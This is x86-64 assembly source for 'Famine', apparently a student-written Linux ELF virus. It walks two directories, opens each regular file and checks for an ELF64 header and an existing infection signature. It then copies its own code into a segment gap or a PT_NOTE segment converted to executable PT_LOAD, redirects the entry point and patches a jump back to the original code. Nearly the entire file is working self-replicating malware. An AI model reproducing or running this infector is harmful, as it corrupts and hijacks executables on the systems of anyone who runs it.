%include "famine.inc"

bits 64
default rel

section .text
global _start

_start:
    ; placing famine on the stack
	push rbp
    mov rbp, rsp
	PUSHA
    lea rdi, [rel dir1]					; dir to open for arg readDir
    mov rsi, dir1Len
    call _readDir

    lea rdi, [rel dir2]
    mov rsi, dir2Len
    call _readDir
	_final_jmp:
	POPA
	mov rsp, rbp
	pop rbp
	_bf_exit:
    jmp _Famine_exit

; take directory to open in rdi && size of pwd on rsi
_readDir:
    push rbp
    mov rbp, rsp
    sub rsp, famine_size
	lea r8, FAM(famine.fd)
	or qword [r8], -1
    lea r8, FAM(famine.pwdPtr)
    mov [r8], rdi
    lea r8, FAM(famine.lenghtPwd)
    mov [r8], rsi
    mov rax, SYS_OPEN
    mov rsi, O_RDONLY | O_DIRECTORY
    xor rdx, rdx
    syscall
    cmp rax, 0
	jl _returnReadir
    lea rdi, FAM(famine.fd)                         ; enregistre le fd dans la struct
    mov [rdi], rax

    _getDents:
        lea r10, FAM(famine.fd)
        mov rdi, [r10]
        lea r9, FAM(famine.total_read)              ; init total_read
        mov DWORD[r9], 0
        mov rax, SYS_GETDENTS                   	; getdents64(int fd, void *buf, size_t size_buf)
        lea rsi, FAM(famine.dirents)
        mov rdx, PAGE_SIZE
        syscall
        cmp rax, 0
        jle _returnReadir

        lea r10, FAM(famine.dirents_struct_ptr) 	; r10 -> (struct famine.diretents_struct_ptr)
        mov [r10], rsi          	                ; famine.dirents_struct_ptr -> famine.dirents
        lea r11, FAM(famine.total_to_read)      	; r11 -> (struct famine.total_to_read)
        mov DWORD [r11], eax                        ; famine.total_to_read = getdents total length

    _listFile:
        lea r8, FAM(famine.total_read)      		; r8 -> total lu de getdents
        lea r9, FAM(famine.total_to_read)       	; r9 -> total a lire de getdents
        mov r10, FAM(famine.dirents_struct_ptr) 	; r10 -> actual dirent struct
        lea r11, FAM(famine.dirents_struct_ptr) 	; r11 -> ptr de la struct actuelle
        movzx r12, WORD [r10 + D_RECLEN_OFF] 		; r12 = length de la stuct dirents actuelle
        add [r8], r12d                        		; update du total lu dans r8
        add [r11], r12                          	; famine.diretns_struct_ptr -> sur la prochaine struct
        cmp BYTE [r10 + D_TYPE], D_REG_FILE 		; verifie le type du fichier
        jne _checkRead

        _updatePath:
            lea rsi, [r10 + D_NAME]                 	; charge le nom du fichier dans rsi
            mov byte [rsi - 1], '/'
            sub rsi, FAM(famine.lenghtPwd)
            mov rdi, FAM(famine.pwdPtr)
            call _strcpy

			_bf_chk_file:
			call _check_file

        _checkRead:
            mov r8, FAM(famine.total_read)
            mov r12, FAM(famine.total_to_read)
            cmp r8d, r12d                 		; if (total lu >= total getdents)
            jge _getDents
            jmp _listFile

_check_file:
	push rbp
	mov	rbp, rsp
	sub rsp, infection_size
	lea rax, INF(infection.injection_offset)
	mov qword [rax], 0
	lea rax, INF(infection.add_page)
	mov byte [rax], 0
	lea rax, INF(infection.mem_eof)
	mov qword [rax], 0

	_open_file:
		mov	rax, SYS_OPEN
		mov rdi, rsi
		mov rsi, O_RDWR
		xor rdx, rdx
		syscall
		cmp	rax, 0x0
		jl	_leave_return
		mov INF(infection.file_fd), rax

	; === get file size ===
	_get_filesz:
		mov rax, SYS_LSEEK
		mov	rdi, INF(infection.file_fd)
		mov	rsi, 0x0
		mov rdx, SEEK_END
		syscall
		cmp rax, 0x0
		jle _close_file_inf
		mov INF(infection.map_size), rax
		mov INF(infection.original_end), rax

	_map_file:
	; rax	-> map
		mov rsi, rax								; rsi = file_size
		mov rax, SYS_MMAP
		mov	rdi, 0x0
		mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
		mov r10, MAP_SHARED
		mov r8, INF(infection.file_fd)
		mov r9, 0x0
		syscall
		cmp	rax, 0x0								; rax -> map (used later)
		jl _close_file_inf
		lea r8, INF(infection.map_addr)
		mov [r8], rax

	_check_format:
		cmp	dword [rax + 1], 0x02464c45				; if != 'ELF64'
		jne _unmap_close_inf

	_check_already_infected:
	; rax	== total segment number
	; r9	== injection offset
	; r13	== original segment end offset
	; r14	-> header table
	; r15	-> map
		mov r15, rax
		mov r14, r15
		add r14, [r14 + elf64_ehdr.e_phoff]
		xor rcx, rcx
		_go_to_last_segment:
			cmp cx, [r15  + elf64_ehdr.e_phnum]
			jge _go_to_last_segment_end	
			add r14, elf64_phdr_size
			inc rcx
			jmp _go_to_last_segment
		_go_to_last_segment_end:
		mov	INF(infection.last_seg_hdr_addr), r14
		xor r9, r9
		_segment_loop:
			cmp cx, 0
			jle	_segment_loop_end
			_check_segment_format:
				bt word [r14], 0				; is segment header's first bit != 0
				jnc _continue
				bt qword [r14], 0x20			; is segment header's 33rd bit == 1
				jc _handle_valid_segment
			_continue:
				dec rcx
				sub r14, elf64_phdr_size
				jmp _segment_loop

		_segment_loop_end:
			mov r9, INF(infection.injection_offset)
			cmp r9, 0
			je _unmap_close_inf
			cmp byte INF(infection.add_page), 1						; if new page needed jump _add page
			je _add_page
			jmp _infection										; else jmp _infection

		_handle_valid_segment:
		; Check if the segment signed, else check the size, if big enough save the offsets if not already done
			_check_signature:
			; r8	-> potential signature
			; r9	== signature variable
				mov r8, r15
				add r8, [r14 + elf64_phdr.p_offset]
				add r8, [r14 + elf64_phdr.p_filesz]
				sub r8, signature_len
				mov r9, [rel signature]
				cmp qword r9, [r8]
				je _unmap_close_inf

			_valid_seg_already_found:
				mov r9, INF(infection.injection_offset)
				test r9, r9
				jz _check_cave_size
				mov r9, INF(infection.add_page)
				test r9, r9
				jz _continue

			_check_cave_size:
			; r8	== end of infection offset
			; r9	== next segment offset
				mov r8, [r14 + elf64_phdr.p_offset]
				add r8, [r14 + elf64_phdr.p_filesz]
				mov r13, r8								; save segment end's offset
				add r8, CODE_LEN
				mov r9, r14
				add r9, elf64_phdr_size
				add r9, elf64_phdr.p_offset
				cmp [r9], r8
				setb INF(infection.add_page)			; if ([r9] < r8) { infection.add_page = 1) }

			_save_offsets:
			; r8	-> infection structure members
			; r9	== injection address
			; r12	== original entrypoint
			;*r13	== segment end's offset (_check_cave_size)
			;*r14	-> segment header in header table
				lea r8, INF(infection.seg_nb)
				mov [r8], cl
				lea r8, INF(infection.original_entry)
				mov r12, [r15 + elf64_ehdr.e_entry]
				mov [r8], r12
				lea r8, INF(infection.injection_offset)
				mov [r8], r13
				lea	r8, INF(infection.injection_addr)
				push r9
				mov r9, [r14 + elf64_phdr.p_vaddr]
				add r9, [r14 + elf64_phdr.p_memsz]
				mov [r8], r9
				pop r9
				lea r8, INF(infection.seg_hdr_addr)
				mov [r8], r14
				jmp _continue

_add_page:
	_update_file_size:
		mov rax, SYS_FTRUNCATE
		mov rdi, INF(infection.file_fd)
		lea rsi, INF(infection.map_size)
		push qword [rsi]
		add qword [rsi], PAGE_SIZE
		and qword [rsi], -4096
		add qword [rsi], CODE_LEN
		mov rsi, [rsi]
		syscall
		pop rsi
		cmp rax, 0
		jl _unmap_close_inf

	_unmap_prev_map:
		mov rdi, INF(infection.map_addr)
		mov rax, SYS_UNMAP
		syscall

	_remap_file:
		mov rax, SYS_MMAP
		mov	rdi, 0x0
		mov rsi, INF(infection.map_size)				; rsi = file_size
		mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
		mov r10, MAP_SHARED
		mov r8, INF(infection.file_fd)
		mov r9, 0x0
		syscall
		cmp	rax, 0x0									; rax -> map (used later)
		jl _close_file_inf
		lea r8, INF(infection.map_addr)
		mov [r8], rax

	_find_memory_eof:
		mov r14, INF(infection.map_addr)
		movzx rax, word [r14 + elf64_ehdr.e_shnum]
		add r14, [r14 + elf64_ehdr.e_shoff]
		xor rcx, rcx
		
		_find_mem_eof_loop:
			cmp rcx, rax
			jge _find_mem_eof_end
			mov rbx, [r14 + elf64_shdr.sh_addr]
			add rbx, [r14 + elf64_shdr.sh_size]
			cmp INF(infection.mem_eof), rbx
			jge _find_mem_eof_continue
			mov INF(infection.mem_eof), rbx
			
		_find_mem_eof_continue:
			add r14, elf64_shdr_size
			inc rcx
			jmp _find_mem_eof_loop
		
		_find_mem_eof_end:

	_find_pt_note:
	; r14	-> segmentS header
	; rcx	== segment counter
		mov r14, INF(infection.map_addr)
		movzx rax, word [r14 + elf64_ehdr.e_phnum]
		add r14, [r14 + elf64_ehdr.e_phoff]
		xor rcx, rcx
		
		_find_pt_note_loop:
			cmp rcx, rax
			jge _find_pt_note_loop_end
			cmp dword [r14 + elf64_phdr.p_type], PT_NOTE
			je _mutate_pt_note_seg
			
		_find_pt_note_loop_continue:
			add r14, elf64_phdr_size
			inc rcx
			jmp _find_pt_note_loop
		
		_find_pt_note_loop_end:
			mov r14, -1					; detect if no note found. See _mutate_pt_note_seg line 1
	
	_mutate_pt_note_seg:
	; r14	-> segment header
	; rax	== new offset / address
		cmp r14, 0
		jl	_update_final_jump
		mov dword [r14 + elf64_phdr.p_type], PT_LOAD
		mov qword [r14 + elf64_phdr.p_flags], PF_X | PF_R
		mov qword [r14 + elf64_phdr.p_filesz], CODE_LEN
		mov qword [r14 + elf64_phdr.p_memsz], CODE_LEN
		mov qword [r14 + elf64_phdr.p_align], 0x1000
		mov rax, INF(infection.original_end)
		add rax, 0x1000
		and rax, -4096
		mov qword [r14 + elf64_phdr.p_offset], rax
		mov qword INF(infection.injection_offset), rax
		mov rax, INF(infection.mem_eof)
		add rax, 0x1000
		and rax, -4096
		mov qword INF(infection.injection_addr), rax
		mov qword [r14 + elf64_phdr.p_vaddr], rax
		mov qword [r14 + elf64_phdr.p_paddr], rax

_infection:
	_update_elf_hdr:
	; r8	-> elf header entrypoint
	; r9	== end of segment + align (injection offset)
	; r10	== injection offset
		mov r8, INF(infection.map_addr)
		add r8, elf64_ehdr.e_entry
		mov r10, INF(infection.injection_addr)
		mov [r8], r10
		cmp byte INF(infection.add_page), 0
		jg _copy_parasite
		mov rdi, CODE_LEN
		call _update_seg_sizes

	_copy_parasite:
	; rdi	-> injection start
	; rsi	-> parasite _start
	; rcx	== code len (_end - _start)
		mov rdi, INF(infection.map_addr)
		add rdi, INF(infection.injection_offset)
		lea rsi, [rel _start]					; rsi -> start of our code
		mov rcx, CODE_LEN						; counter will decrement
		cld										; copy from _start to _end (= !std)
		rep movsb

	_update_final_jump:
	; r8 -> _bf_exit instruction's addr (_bf_exit + 1)
	; r9 == distance to jump from final jump to original entry point
		mov r8, INF(infection.map_addr)
		add r8, INF(infection.injection_offset)
		add r8, FINJMP_OFF
		inc r8
		mov r10, INF(infection.injection_addr)
		add r10, FINJMP_OFF
		add r10, 0x05
		mov r9, INF(infection.original_entry)
		sub r9, r10
		mov [r8], r9d
		jmp _unmap_close_inf

_update_seg_sizes:
; r8	-> segment header data
;*r14	-> segment header in header table

	mov r8, INF(infection.seg_hdr_addr)
	push r8											; save header start for later

	; * Update file size *
	add r8, qword elf64_phdr.p_filesz
	add qword [r8], rdi
	pop r8

	; * Update memory size *
	add r8, elf64_phdr.p_memsz
	add qword [r8], rdi
	
	ret

_unmap_close_inf:
	lea rdi, INF(infection.map_addr)
	lea rsi, INF(infection.map_size)
	mov rax, SYS_UNMAP
	syscall
	jmp _close_file_inf

_close_file_inf:
	mov	rax, SYS_CLOSE
	mov	rdi, INF(infection.file_fd)
	syscall
	mov qword INF(infection.file_fd), -1
	jmp _leave_return

_returnReadir:
	mov rdi, FAM(famine.fd)
	cmp rdi, 0
	jle	_leave_return
	mov rax, SYS_CLOSE
	syscall
	or qword FAM(famine.fd), -1
	jmp _leave_return

_leave_return:
	leave
	ret

_Famine_exit:
    mov rax, 60
    xor rdi, rdi
    syscall

;strcpy(dst:rsi src: rdi) (without /0 at the end)
_strcpy:
	xor rcx, rcx
	strcpy_loop:
		cmp byte [rdi + rcx], 0
		je	strcpy_loop_end
		mov al, byte [rdi + rcx]
		mov [rsi + rcx], al
		add rcx, 1
		jmp strcpy_loop

	strcpy_loop_end:
		; mov byte [rsi + rcx], 0
		ret

; debug
; strlen(str:rsi)
_strlen:
	xor rcx, rcx

	ft_strlen_loop:
		cmp	byte [rsi + rcx], 0
		je	ft_strlen_end
		inc rcx
		jmp	ft_strlen_loop

	ft_strlen_end:
		mov rax, rcx
		ret

	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
	;nop
